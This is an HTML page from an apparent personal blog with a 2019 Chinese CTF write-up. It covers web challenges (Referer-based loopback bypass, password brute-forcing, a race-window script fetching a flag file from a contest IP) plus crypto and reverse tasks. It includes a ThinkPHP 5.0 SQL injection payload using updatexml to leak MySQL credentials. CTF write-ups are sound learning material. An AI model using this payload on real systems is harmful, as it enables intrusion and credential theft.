@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>豌豆杯入学CTF :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content=" 1.题目:小可爱 第一步肯定是绕过本地回环地址 一开始想到的是x-forward-for等告诉服务器我的地址但发现没有绕过 看题目题目是说来源地址想到了referer成功绕过 这里没啥思路只能爆破 密码为orange 访问到另外一个页面 然后登录。 发现是一张迪丽热巴的图片 这个主管很喜欢迪丽热巴啊！！ 将图片下载下来，用binwalk查看下发现有压缩包!foremost下得到压缩包发现有密码 这个地方解了很久发现使用Dilraba的md5。。。。 得到一张图片再一次foremost得到一个压缩包成功拿到flag 2.题目:单身二十年 &lt;?php header(&#34;Content-type:text/html;charset=utf-8&#34;); show_source(__FILE__); if($_COOKIE[&#39;token&#39;]==&#39;5D41402ABC4B2A76B9719D911017C592&#39;){ $file = &#39;dump/&#39;.md5(base64_encode(mt_rand(1,100))).&#39;.txt&#39;; file_put_contents($file,file_get_contents(&#39;327A6C4304AD5938EAF0EFB6CC3E53DC.php&#39;)); sleep(10); unlink($file); }else{ header(&#39;Location: index.php&#39;); } setcookie(&#34;token&#34;); ?&gt; 看懂源码发现访问页面会睡眠十秒他会把flag写入到一个1到100随机数字经过base64,md5的txt文件里。 一种是用burp直接get到这里我就不演示了,我是直接写的python,访问下页面执行脚本就行了。 import base64 import hashlib import requests for i in range(1,101): headers = {&#39;Content-type&#39;:&#39;text/html;charset=utf-8&#39;} encodestr = base64.b64encode(str(i).encode(&#39;utf-8&#39;)) cookies = {&#39;token&#39;:&#39;5D41402ABC4B2A76B9719D911017C592&#39;} #print(encodestr) m = hashlib.md5() m.update(encodestr) #print(m.hexdigest()) a = m.hexdigest() url = &#39;http://106.14.145.133:8081/web10/dump/&#39;&#43;a&#43;&#39;.txt&#39; #print(url) url_get = requests.get(url,headers=headers,cookies=cookies,timeout=2) #print(url_get.headers) #print(url_get.cookies) if url_get.status_code == 200: print(url_get.text) 3.题目:初心不改 访问页面发现是一个thinkphp5.0 一猜就是sql注入 一开始以为是构造一个注入然后load_file到flag后来发现想多了，直接通过payload拿到mysql账号密码 /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 主页查看源码发现有一个phpmyadmin，登陆后成功拿到flag " />
+<meta name="keywords" content="ctf, 豌豆" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/posts/wandouctf/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="豌豆杯入学CTF">
+<meta property="og:description" content=" 1.题目:小可爱 第一步肯定是绕过本地回环地址 一开始想到的是x-forward-for等告诉服务器我的地址但发现没有绕过 看题目题目是说来源地址想到了referer成功绕过 这里没啥思路只能爆破 密码为orange 访问到另外一个页面 然后登录。 发现是一张迪丽热巴的图片 这个主管很喜欢迪丽热巴啊！！ 将图片下载下来，用binwalk查看下发现有压缩包!foremost下得到压缩包发现有密码 这个地方解了很久发现使用Dilraba的md5。。。。 得到一张图片再一次foremost得到一个压缩包成功拿到flag 2.题目:单身二十年 &lt;?php header(&#34;Content-type:text/html;charset=utf-8&#34;); show_source(__FILE__); if($_COOKIE[&#39;token&#39;]==&#39;5D41402ABC4B2A76B9719D911017C592&#39;){ $file = &#39;dump/&#39;.md5(base64_encode(mt_rand(1,100))).&#39;.txt&#39;; file_put_contents($file,file_get_contents(&#39;327A6C4304AD5938EAF0EFB6CC3E53DC.php&#39;)); sleep(10); unlink($file); }else{ header(&#39;Location: index.php&#39;); } setcookie(&#34;token&#34;); ?&gt; 看懂源码发现访问页面会睡眠十秒他会把flag写入到一个1到100随机数字经过base64,md5的txt文件里。 一种是用burp直接get到这里我就不演示了,我是直接写的python,访问下页面执行脚本就行了。 import base64 import hashlib import requests for i in range(1,101): headers = {&#39;Content-type&#39;:&#39;text/html;charset=utf-8&#39;} encodestr = base64.b64encode(str(i).encode(&#39;utf-8&#39;)) cookies = {&#39;token&#39;:&#39;5D41402ABC4B2A76B9719D911017C592&#39;} #print(encodestr) m = hashlib.md5() m.update(encodestr) #print(m.hexdigest()) a = m.hexdigest() url = &#39;http://106.14.145.133:8081/web10/dump/&#39;&#43;a&#43;&#39;.txt&#39; #print(url) url_get = requests.get(url,headers=headers,cookies=cookies,timeout=2) #print(url_get.headers) #print(url_get.cookies) if url_get.status_code == 200: print(url_get.text) 3.题目:初心不改 访问页面发现是一个thinkphp5.0 一猜就是sql注入 一开始以为是构造一个注入然后load_file到flag后来发现想多了，直接通过payload拿到mysql账号密码 /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 主页查看源码发现有一个phpmyadmin，登陆后成功拿到flag " />
+<meta property="og:url" content="https://vuln.top/posts/wandouctf/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+  
+  <meta property="og:image" content="https://vuln.top/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2019-10-16 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top/">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://vuln.top/posts/wandouctf/">豌豆杯入学CTF</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        2019-10-16 ::
+        
+      </time>
+    
+    
+      <span class="post-author">Ca1s1</span>
+    
+    
+      <span class="post-reading-time">:: 1 min read (190 words)</span>
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+      
+      #<a href="https://vuln.top/tags/php/">php</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <!-- raw HTML omitted -->
+<hr>
+<p>1.题目:小可爱
+第一步肯定是绕过本地回环地址
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110162152/4285938054.png" alt="CC25B038-F2D2-4F85-93F7-F51924B8DAB8.png">
+一开始想到的是<code>x-forward-for</code>等告诉服务器我的地址但发现没有绕过 看题目题目是说来源地址想到了<code>referer</code>成功绕过
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110162315/1177985903.png" alt="BC410D27-3BE1-40E5-ABF5-777F7144F502.png">
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/366387116.png" alt="AEA1A04B-27BA-4393-953B-75D948C95027.png">
+这里没啥思路只能爆破
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2499653827.png" alt="B9E617B3-EF26-477B-B78C-534C490FB3C4.png">
+密码为orange 访问到另外一个页面 然后登录。 发现是一张迪丽热巴的图片 这个主管很喜欢迪丽热巴啊！！
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/1630037561.png" alt="122FC809-D249-4228-9EB5-1E7F101BB7C1.png">
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/296032636.png" alt="ADBC80E5-9B6D-4483-B1D4-286FE4B9E3F2.png">
+将图片下载下来，用<code>binwalk</code>查看下发现有压缩包!<code>foremost</code>下得到压缩包发现有密码
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/RujlNg.png" alt="70BBCD6F-2D2E-4D93-8F11-80D576A5CB54.png">
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2411784842.png" alt="DABA844F-3716-4889-96CA-04A7E6137C96.png">
+这个地方解了很久发现使用Dilraba的md5。。。。
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2601915022.png" alt="F0312D7E-FC35-4DE9-86AF-D5A0F5796C97.png">
+得到一张图片再一次foremost得到一个压缩包成功拿到flag
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2175607698.png" alt="C065BA1C-B8B1-4157-9E8A-D6BD23ED6440.png">
+2.题目:单身二十年
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/1468141901.png" alt="EA018BA0-F2BB-4204-9784-8E3585F3511B.png"></p>
+<pre tabindex="0"><code>&lt;?php 
+
+header(&#34;Content-type:text/html;charset=utf-8&#34;); 
+show_source(__FILE__); 
+if($_COOKIE[&#39;token&#39;]==&#39;5D41402ABC4B2A76B9719D911017C592&#39;){ 
+    $file    =    &#39;dump/&#39;.md5(base64_encode(mt_rand(1,100))).&#39;.txt&#39;; 
+    file_put_contents($file,file_get_contents(&#39;327A6C4304AD5938EAF0EFB6CC3E53DC.php&#39;)); 
+    sleep(10); 
+    unlink($file); 
+}else{ 
+    header(&#39;Location: index.php&#39;); 
+} 
+
+setcookie(&#34;token&#34;); 
+
+?&gt;
+</code></pre><p>看懂源码发现访问页面会睡眠十秒他会把flag写入到一个1到100随机数字经过base64,md5的txt文件里。
+一种是用burp直接get到这里我就不演示了,我是直接写的python,访问下页面执行脚本就行了。
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3316060136.png" alt="9BB9177B-2227-4784-A0BB-B029ED948AF3.png"></p>
+<pre tabindex="0"><code>import base64
+import hashlib
+import requests
+for i in range(1,101):
+	headers = {&#39;Content-type&#39;:&#39;text/html;charset=utf-8&#39;}
+	encodestr = base64.b64encode(str(i).encode(&#39;utf-8&#39;))
+	cookies = {&#39;token&#39;:&#39;5D41402ABC4B2A76B9719D911017C592&#39;}
+	#print(encodestr)
+	m = hashlib.md5()
+	m.update(encodestr)
+	#print(m.hexdigest())
+	a = m.hexdigest()
+	url = &#39;http://106.14.145.133:8081/web10/dump/&#39;+a+&#39;.txt&#39;
+	#print(url)
+	url_get = requests.get(url,headers=headers,cookies=cookies,timeout=2)
+	#print(url_get.headers)
+	#print(url_get.cookies)
+	if url_get.status_code == 200:
+		print(url_get.text)
+</code></pre><p>3.题目:初心不改
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2370270929.png" alt="1975DE5B-D07B-4569-B8D0-E7171F2A034C.png">
+访问页面发现是一个thinkphp5.0 一猜就是sql注入
+一开始以为是构造一个注入然后load_file到flag后来发现想多了，直接通过payload拿到mysql账号密码
+<code>/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code>
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2511860583.png" alt="BA7D4195-9527-4B06-A1D8-28ABF453FE46.png">
+主页查看源码发现有一个phpmyadmin，登陆后成功拿到flag
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3803853201.png" alt="73F165EC-C956-40AD-9106-ADE323691340.png"></p>
+<h2 id="crypto题">web题我是全部AK掉了有些题目是通过exp直接拿到flag太简单了就不讲了。
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3180203719.png" alt="ADE2EF99-DEF7-46F4-AA7D-066EC4402E12.png">
+Crypto题</h2>
+<p>1.题目:震惊，凯撒竟被4人关在一密室</p>
+<pre tabindex="0"><code>凯撒被4个人关在一个密室里！
+aCU3QjkxMjkxMTA3bjVnMTZoNjNjJTdEY2cwNDBoM2g4aTRlMDc3ZmYz
+</code></pre><p>先是base64
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/4195125983.png" alt="9B275494-53D5-4527-8A72-F5844E6A5CD8.png">
+然后url编码
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/1834402293.png" alt="647F179F-6624-426A-924B-3538D10E806A.png">
+栅栏编码四组
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3756062370.png" alt="9D959343-EA85-4A6D-85A4-7D017E27DDE7.png">
+凯撒拿到flag
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2613812638.png" alt="9192AE6D-3539-4AC4-83FD-97E3D50A533A.png"></p>
+<p>2.题目:粗心大意的主管
+已知密文为:925♥♥♥A2D74♥♥DDE4♥EBC0♥♥♥1D0E♥♥7
+原文为:8E5♥♥C14DCD♥CDE8♥♥55F3738♥11DE7A。
+写个python就行了</p>
+<pre tabindex="0"><code># -*- coding: utf-8 -*-
+import string
+import hashlib
+payloads = &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
+
+for a in payloads:
+    for b in payloads:
+        for c in payloads:
+        	for d in payloads:
+        		for e in payloads:
+        			for f in payloads:
+			            s = &#34;8E5&#34;+a+d+&#34;C14DCD&#34;+b+&#34;CDE8&#34;+e+c+&#34;55F3738&#34;+f+&#34;11DE7A&#34;
+			            tmp = hashlib.md5(s).hexdigest().upper()
+			            if &#39;925&#39; in tmp and &#39;A2D74&#39; in tmp and &#39;DDE4&#39; in tmp and &#39;EBC0&#39; in tmp:
+			                print(s)
+		               		print(tmp)
+</code></pre><p>3.题目:畸形的凯撒
+密文：afZ_rCI[kA55#;ASc9*%$c</p>
+<pre tabindex="0"><code>char=&#34;afZ_rCI[kA55#;ASc9*%$c&#34;
+i = 0
+flag = &#34;&#34;
+while i &lt; len(char):
+	num = ord(char[i])+(i+5)
+	flag+=chr(num)
+	i+=1
+print(flag)
+</code></pre><h2 id="reverse">REVERSE<a href="#reverse" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>1.题目:机密文件
+用NET.Reflector Pro工具打开文件
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2721756916.png" alt="6B517F8B-57C6-43CC-AD32-AF739244D967.png">
+看到源代码
+发现是aes加密使用openssl解密或者用c#再写一个解密的
+password也在里面
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3386985755.png" alt="27E2F10D-6444-4F29-A275-9BBA743B8386.png">
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/618023056.png" alt="593D7C75-0E7F-4421-A4C7-A572F8ED6572.png"></p>
+<pre tabindex="0"><code>openssl aes-128-cbc -nosalt -d -in secret.636748579460890458.bin -iv 6b6a704853325367344c716637754e65 -K 6b6a704853325367344c716637754e65 -p
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h"></span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://vuln.top/posts/burpjsencrypt/">
+                <span class="button__icon">←</span>
+                <span class="button__text">jsEncrypter 加密</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://vuln.top/posts/redhat2021/">
+                <span class="button__text">RedHat2021 CTF</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
